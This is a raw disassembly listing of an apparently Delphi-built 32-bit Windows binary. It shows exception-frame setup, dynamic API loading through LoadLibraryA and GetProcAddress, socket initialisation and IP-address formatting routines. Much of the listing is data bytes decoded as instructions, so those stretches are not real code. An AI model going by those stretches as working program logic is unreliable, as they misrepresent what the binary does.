add [ esi + edx * 2 + 0x47 ] ah
add bh dl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add al bl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add cl bl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add dl bl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add bl bl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add ah bl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add ch bl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add dh bl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add bh bl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add al al
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add cl al
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add dl al
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add bl al
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add ah al
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add ch al
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add dh al
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add bh al
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add al cl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add cl cl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add dl cl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add bl cl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add ah cl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add ch cl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add dh cl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add bh cl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ eax + 0x640000fe ] dh
push esi
inc edi
add [ ecx + 0x640000fe ] dh
push esi
inc edi
add [ edx + 0x640000fe ] dh
push esi
inc edi
add [ ebx + 0x640000fe ] dh
push esi
inc edi
add [ esi + edi * 8 + 0x56640000 ] dh
inc edi
add [ ebp + 0x640000fe ] dh
push esi
inc edi
add [ esi + 0x640000fe ] dh
push esi
inc edi
add [ edi + 0x550000fe ] dh
mov ebp esp
xor eax eax
push ebp
push sub_45e415
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e41c
retn
sub_45e42c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
jmp r-xdata
inc ebp
retn
lea eax [ ebx + 0x10 ]
call sub_403ffc
push edi
push r-xdata
push [ ebx + 0x10 ]
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404328
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax ebx
call sub_40b6f8
inc ebp
jb r-xdata
hlt
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x180045e4 ] cl
add [ eax ] al
add [ eax - 0x20 ] bl
inc ebp
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x100040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc al 0x0
add [ eax ] al
cmovne ecx [ ecx + 0x64 ]
push edi
push ebx
xor dl [ ebx + 0x74 ]
jne r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x45 ] dh
rcl [ ebp - 0x75 ] 0xec
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_45e540
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x14 ]
mov edx edi
call sub_403ffc
mov [ ebx + 0xc ] esi
test esi esi
jne r-xdata
add esp 0xfffffff0
call sub_40357c
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_40aef0
mov edx [ ebp - 0x8 ]
mov ecx edi
xor edx edx
mov eax ebx
call sub_40b6f8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e547
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403fcc
retn
sub_45e4a0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_45e540
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x14 ]
mov edx edi
call sub_403ffc
mov [ ebx + 0xc ] esi
test esi esi
jne r-xdata
add esp 0xfffffff0
call sub_40357c
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_40aef0
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x10 ]
call sub_403ffc
push edi
push r-xdata
push [ ebx + 0x10 ]
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404328
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax ebx
call sub_40b6f8
mov ecx edi
xor edx edx
mov eax ebx
call sub_40b6f8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e547
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403fcc
retn
sub_45e547
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_45f324
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_45f3c7
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ eax + eax * 2 ]
lea ebx [ eax * 4 + rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
mov eax [ ebx + 0x4 ]
mov [ eax ] esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f3ce
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fcc
retn
push 0x276d
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b88
mov eax [ ebp - 0x8 ]
mov edx [ ebx + 0x8 ]
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] 0x6
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_408db8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45e4a0
call sub_4039e4
sub_45f3d8
push ebx
xor eax eax
mov [ rw-data ] eax
mov ecx 0x70
mov eax rw-data
mov edx eax
mov ebx [ edx + 0x4 ]
mov edx [ edx ]
mov [ ebx ] edx
add eax 0xc
dec ecx
jne r-xdata
pop ebx
retn
sub_45f3fc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45f4c9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
push eax
mov ax [ ebp + 0x8 ]
push eax
call [ rw-data ]
mov ebx eax
jmp r-xdata
call GetLastError
push eax
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b88
mov eax [ ebp - 0x8 ]
push eax
mov eax r-xdata
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
pop eax
call sub_408db8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45e4a0
call sub_4039e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f4d0
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fcc
retn
sub_45f507
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_45f534
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f53b
retn
call sub_45e578
sub_45f550
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45f575
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f57c
retn
sub_45f588
aam 0xf5
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
cmc
inc ebp
add [ eax + eax ] al
add [ eax ] al
mov al [ 0xffffffffa0004010 ]
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + ebp + 0x2a8c0040 ] cl
inc eax
add [ edx + ebp + 0x2a8c0040 ] cl
inc eax
add [ 0x53644954 ] cl
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add al ch
cld
inc ebp
add [ edx + ebp + 0x2a8c0040 ] cl
inc eax
add [ edx + ebp - 0x73fffc0 ] cl
inc ebp
add [ edx + ebp + 0x2a8c0040 ] cl
inc eax
add [ edx + ebp + 0x2a8c0040 ] cl
inc eax
add [ edx + ebp + 0x2a8c0040 ] cl
inc eax
add [ edx + ebp + 0x2a8c0040 ] cl
inc eax
add [ edx + ebp + 0x2a8c0040 ] cl
inc eax
add [ edx + ebp + 0x2a8c0040 ] cl
inc eax
add [ edx + ebp + 0x2a8c0040 ] cl
inc eax
add [ edx + ebp + 0x2a8c0040 ] cl
inc eax
add [ edx + ebp + 0x2a8c0040 ] cl
inc eax
add [ edx + ebp + 0x2a8c0040 ] cl
inc eax
add [ edx + ebp + 0x2a8c0040 ] cl
inc eax
add al ah
clc
inc ebp
add [ edx + ebp + 0x2a8c0040 ] cl
inc eax
add [ edx + ebp + 0x2a8c0040 ] cl
inc eax
add [ edx + ebp + 0x2a8c0040 ] cl
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x80040 ] dl
imul esi [ ebx + 0x74 ] 0xf640c08b
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
test [ ebp ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh dl
test [ ebp ] 0x10
add [ eax ] al
add [ eax - 0x5fffbff0 ] ah
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0045f7 ] cl
add [ eax ] al
add al ah
test [ ebp ] 0xa0
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
arpl [ ebx - 0x70 ] bp
sub al 0xf7
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 8 ] ch
inc ebp
add [ eax + eax ] cl
add [ eax ] al
pop eax
loopne r-xdata
arpl [ ebp + 0x65 ] sp
push 0xffffffff
outsd
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ 0x53644945 ] cl
je r-xdata
mov bh dh
inc ebp
add [ eax + eax ] cl
add [ eax ] al
loopne r-xdata
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax * 2 + 0x74536449 ] bl
popad
arpl [ ebx + 0x49 ] bp
outsb
imul esi [ ecx + ebp * 2 + 0x61 ] 0x617a696c
je r-xdata
inc ebp
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
je r-xdata
arpl [ ebx + 0x45 ] bp
jb r-xdata
je r-xdata
inc esi
popad
imul ebp [ ebp + 0x64 ] 0xf400408d
test [ ebp ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
imul edi [ edx + 0x61 ] 0x6e6f6974
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
test [ ebp ] 0xc
loopne r-xdata
outsd
jb r-xdata
add [ eax ] al
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
lea ecx [ esp + 0x4 ]
call sub_45f818
retn
imul edi [ edx + 0x65 ] 0x65637845
push 0xffffffff
hlt
inc ebp
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edi ] dl
inc ebp
dec ecx
push ebx
je r-xdata
add [ eax ] al
or [ ecx + ecx * 2 + 0x64 ] dl
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ eax ] al
ror [ eax + 0x45f7 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
retn 0x4
arpl [ ebx + 0x53 ] bp
je r-xdata
sub_45f818
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi eax
xor ebx ebx
inc edx
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x6c ]
mov [ esi + 0x4 ] eax
mov edx [ ebp + 0x8 ]
test edx edx
jl r-xdata
mov edx [ esi + 0x4 ]
mov eax esi
call sub_45f860
inc edx
mov eax edi
add eax 0x4
dec edx
jne r-xdata
mov bl 0x1
jmp r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
sub_45f860
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45f8b2
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x68 ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_45e178
call sub_4039e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f8b9
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_45f8e0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov esi edx
xor eax eax
push ebp
push sub_45fcda
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403fa8
mov eax esi
add eax 0xffffd8ec
cmp eax 0x3e
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b88
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
pop eax
call sub_408db8
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_403ffc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fce1
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fcc
retn
jmp [ eax * 4 + jump_table_45f920 ]
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
sub_45fce8
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_45fd18
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404458
xor eax eax
push ebp
push sub_45fd60
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x80 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fd67
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_45fd70
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45fd95
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fd9c
retn
sub_45fda9
std
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi * 8 ] al
inc ebp
add [ eax ] cl
add [ eax ] eax
add [ eax - 0x5fffba0b ] cl
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax ] al
or eax 0xc980046
inc esi
add [ eax + 0xd ] ch
inc esi
add ah bh
or al 0x46
add [ esp + edx * 2 ] dl
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add al al
inc [ ebp ]
les ecx [ eax ]
inc esi
add [ ecx + ecx + 0x46 ] ch
add [ esi + eax ] bh
inc esi
add ah bh
inc [ ebp ]
cwde
add [ esi ] al
sub [ ecx ] al
inc esi
add [ ecx + eax + 0x1a00046 ] dl
inc esi
add al dh
add [ esi ] eax
imul esi [ ebx + 0x74 ] 0x646e6957
outsd
ja r-xdata
xchg ebp eax
insb
arpl [ ebx + 0x57 ] bp
imul ebp [ esi + 0x64 ] 0x5573776f
mov ebp esp
add esp 0xfffffe6c
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x194 ] ecx
test dl dl
je r-xdata
pushfd
add al [ esi ]
dec esp
add al [ esi ]
pushfd
push es
inc esi
add [ edi + eax + 0x6840046 ] ah
inc esi
add al bl
add al [ esi ]
nop
push es
inc esi
add [ eax + ecx + 0x8b80046 ] ch
inc esi
add ah ah
add al [ esi ]
add [ ebx ] al
inc esi
add [ esp + eax + 0x46 ] bh
add [ ebp + eax + 0x5b00046 ] dl
inc esi
add [ esi + eax ] bl
inc esi
add [ esi + eax + 0x46 ] ch
add [ ebx + ecx ] ch
inc esi
add [ ebp + ecx + 0x6600046 ] bl
inc esi
add [ eax ] bh
or eax [ esi ]
fmul [ ebx ]
inc esi
add [ eax + 0xc ] bh
inc esi
add al ch
inc [ ebp ]
push eax
or al [ esi ]
andps xmm1 [ ecx + 0x64 ]
push ebx
je r-xdata
lea eax [ eax ]
push 0x45fe
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
inc [ ebp ]
adc [ eax ] al
add [ eax ] al
hlt
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_45ff9a
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_45f8c0
cmp [ rw-data ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_40357c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ffa1
lea eax [ ebp - 0x194 ]
call sub_403fa8
retn
lea eax [ ebp - 0x18e ]
push eax
push 0x202
call sub_45f3fc
inc eax
jne r-xdata
mov [ rw-data ] 0x1
lea edx [ ebp - 0x194 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x194 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
sub_45ffc0
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45fce8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_45ffe8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_46007c
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov al [ ebx ]
lea edx [ ebp - 0x4 ]
call sub_407f50
push [ ebp - 0x4 ]
push r-xdata
xor eax eax
mov al [ ebx + 0x1 ]
lea edx [ ebp - 0x8 ]
call sub_407f50
push [ ebp - 0x8 ]
push r-xdata
xor eax eax
mov al [ ebx + 0x2 ]
lea edx [ ebp - 0xc ]
call sub_407f50
push [ ebp - 0xc ]
push r-xdata
xor eax eax
mov al [ ebx + 0x3 ]
lea edx [ ebp - 0x10 ]
call sub_407f50
push [ ebp - 0x10 ]
mov eax esi
mov edx 0x7
call sub_404328
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460083
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fcc
retn
sub_46008f
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_460117
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x10
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_403ffc
mov ax [ ebp - 0x16 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46011e
lea eax [ ebp - 0x1c ]
call sub_403fa8
retn
sub_460128
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov ax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] ax
mov eax esi
call sub_404268
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_45fd18
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x12 ] ax
push 0x10
lea eax [ ebp - 0x14 ]
push eax
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4601a0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebp - 0x10 ] cx
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_45fd18
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xe ] ax
push 0x10
lea eax [ ebp - 0x10 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4601f0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax edi
call sub_404468
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov dl [ eax ]
mov [ esp ] dl
mov dl [ eax + 0x1 ]
mov [ esp + 0x1 ] dl
mov dl [ eax + 0x2 ]
mov [ esp + 0x2 ] dl
mov al [ eax + 0x3 ]
mov [ esp + 0x3 ] al
mov ecx esi
